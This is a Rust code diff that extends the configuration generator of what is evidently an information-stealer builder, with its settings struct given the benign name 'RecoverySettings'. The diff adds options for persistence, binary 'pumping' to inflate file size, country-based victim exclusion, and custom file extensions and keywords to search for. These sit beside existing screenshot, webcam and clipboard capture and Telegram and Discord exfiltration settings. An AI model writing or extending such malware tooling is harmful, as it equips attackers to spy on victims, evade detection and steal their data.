@@ -45,6 +45,11 @@ struct RecoverySettings {
     capture_screenshots: Option<bool>,
     capture_webcams: Option<bool>,
     capture_clipboard: Option<bool>,
+    persistence: Option<bool>,
+    pump_size_mb: Option<u32>,
+    blocked_countries: Option<Vec<String>>,
+    custom_extensions: Option<Vec<String>>,
+    custom_keywords: Option<Vec<String>>,
 }
 
 #[derive(Debug, Deserialize)]
@@ -120,6 +125,53 @@ fn render_defaults_rs(settings: &RecoverySettings) -> Result<String, String> {
     let default_capture_screenshots = settings.capture_screenshots.unwrap_or(false);
     let default_capture_webcams = settings.capture_webcams.unwrap_or(false);
     let default_capture_clipboard = settings.capture_clipboard.unwrap_or(false);
+    let default_persistence = settings.persistence.unwrap_or(false);
+    let default_pump_size_mb = settings.pump_size_mb.unwrap_or(0);
+
+    let default_blocked_countries = if let Some(countries) = &settings.blocked_countries {
+        if countries.is_empty() {
+            "None".to_string()
+        } else {
+            let items = countries
+                .iter()
+                .map(|c| format!("\"{}\"", escape_rust_string(c)))
+                .collect::<Vec<_>>()
+                .join(", ");
+            format!("Some(&[{items}])")
+        }
+    } else {
+        "None".to_string()
+    };
+
+    let default_custom_extensions = if let Some(exts) = &settings.custom_extensions {
+        if exts.is_empty() {
+            "None".to_string()
+        } else {
+            let items = exts
+                .iter()
+                .map(|s| format!("\"{}\"", escape_rust_string(s)))
+                .collect::<Vec<_>>()
+                .join(", ");
+            format!("Some(&[{items}])")
+        }
+    } else {
+        "None".to_string()
+    };
+
+    let default_custom_keywords = if let Some(kws) = &settings.custom_keywords {
+        if kws.is_empty() {
+            "None".to_string()
+        } else {
+            let items = kws
+                .iter()
+                .map(|s| format!("\"{}\"", escape_rust_string(s)))
+                .collect::<Vec<_>>()
+                .join(", ");
+            format!("Some(&[{items}])")
+        }
+    } else {
+        "None".to_string()
+    };
 
     let default_telegram_token = settings
         .telegram_token
@@ -153,13 +205,27 @@ pub static DEFAULT_ARTIFACT_KEY: Option<&str> = {default_artifact_key};
 pub static DEFAULT_CAPTURE_SCREENSHOTS: bool = {default_capture_screenshots};
 pub static DEFAULT_CAPTURE_WEBCAMS: bool = {default_capture_webcams};
 pub static DEFAULT_CAPTURE_CLIPBOARD: bool = {default_capture_clipboard};
+pub static DEFAULT_PERSISTENCE: bool = {default_persistence};
+pub static DEFAULT_PUMP_SIZE_MB: u32 = {default_pump_size_mb};
+pub static DEFAULT_BLOCKED_COUNTRIES: Option<&[&str]> = {default_blocked_countries};
+pub static DEFAULT_CUSTOM_EXTENSIONS: Option<&[&str]> = {default_custom_extensions};
+pub static DEFAULT_CUSTOM_KEYWORDS: Option<&[&str]> = {default_custom_keywords};
 pub static DEFAULT_TELEGRAM_TOKEN: Option<&str> = {default_telegram_token};
 pub static DEFAULT_TELEGRAM_CHAT_ID: Option<&str> = {default_telegram_chat_id};
 pub static DEFAULT_DISCORD_WEBHOOK: Option<&str> = {default_discord_webhook};
 "#,
         default_categories = default_categories,
         default_artifact_key = default_artifact_key,
-        default_capture_screenshots = default_capture_screenshots
+        default_capture_screenshots = default_capture_screenshots,
+        default_capture_webcams = default_capture_webcams,
+        default_capture_clipboard = default_capture_clipboard,
+        default_persistence = default_persistence,
+        default_pump_size_mb = default_pump_size_mb,
+        default_blocked_countries = default_blocked_countries,
+        default_custom_extensions = default_custom_extensions,
+        default_custom_keywords = default_custom_keywords,
+        default_telegram_token = default_telegram_token,
+        default_telegram_chat_id = default_telegram_chat_id,
     ))
 }
 
